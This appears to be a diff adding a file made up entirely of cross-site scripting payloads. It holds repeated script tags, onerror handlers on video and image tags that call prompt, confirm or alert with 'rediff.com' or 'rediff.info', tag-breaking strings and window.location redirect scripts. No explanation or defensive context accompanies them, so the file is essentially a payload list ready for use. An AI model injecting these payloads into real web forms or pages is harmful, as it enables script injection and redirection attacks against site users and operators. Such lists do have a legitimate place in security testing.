@@ -1,0 +1,40 @@
+<video src=1 href=1 onerror="javascript:prompt('rediff.com')"></video>
+</foo="><script>javascript:confirm('rediff.info')</script>>">
+<image src=1 href=1 onerror="javascript:confirm('rediff.info')"></image>
+<!foo="><script>javascript:prompt('rediff.com')</script>>">
+<video src=1 href=1 onerror="javascript:prompt('rediff.com')"></video>
+<script>alert('rediff.com')</script>
+</foo="><script>javascript:confirm('rediff.info')</script>>">
+<video src=1 href=1 onerror="javascript:prompt('rediff.com')"></video>
+<image src=1 href=1 onerror="javascript:confirm('rediff.info')"></image>
+<video src=1 href=1 onerror="javascript:prompt('rediff.com')"></video>
+<!foo="><script>javascript:prompt('rediff.com')</script>>">
+</foo="><script>javascript:confirm('rediff.info')</script>>">
+<script>window.location="htts://www.rediff.com"</script>
+<image src=1 href=1 onerror="javascript:confirm('rediff.info')"></image>
+<!foo="><script>javascript:prompt('rediff.com')</script>>">
+<script>alert('rediff.com')</script>
+</foo="><script>javascript:confirm('rediff.info')</script>>">
+<!foo="><script>javascript:prompt('rediff.com')</script>>">
+<script>window.location="htts://www.rediff.com"</script>
+<script>alert('rediff.com')</script>
+<script>window.location="htts://www.rediff.com"</script>
+<!foo="><script>javascript:prompt('rediff.com')</script>>">
+<!foo="><script>javascript:prompt('rediff.com')</script>>">
+<script>alert('rediff.com')</script>
+<!foo="><script>javascript:prompt('rediff.com')</script>>">
+<script>window.location="htts://www.rediff.com"</script>
+<image src=1 href=1 onerror="javascript:confirm('rediff.info')"></image>
+<video src=1 href=1 onerror="javascript:prompt('rediff.com')"></video>
+<script>window.location="htts://www.rediff.com"</script>
+<script>alert('rediff.com')</script>
+<script>alert('rediff.com')</script>
+<script>alert('rediff.com')</script>
+</foo="><script>javascript:confirm('rediff.info')</script>>">
+<video src=1 href=1 onerror="javascript:prompt('rediff.com')"></video>
+<script>window.location="htts://www.rediff.com"</script>
+</foo="><script>javascript:confirm('rediff.info')</script>>">
+<video src=1 href=1 onerror="javascript:prompt('rediff.com')"></video>
+<image src=1 href=1 onerror="javascript:confirm('rediff.info')"></image>
+<video src=1 href=1 onerror="javascript:prompt('rediff.com')"></video>
+<script>alert('rediff.com')</script>
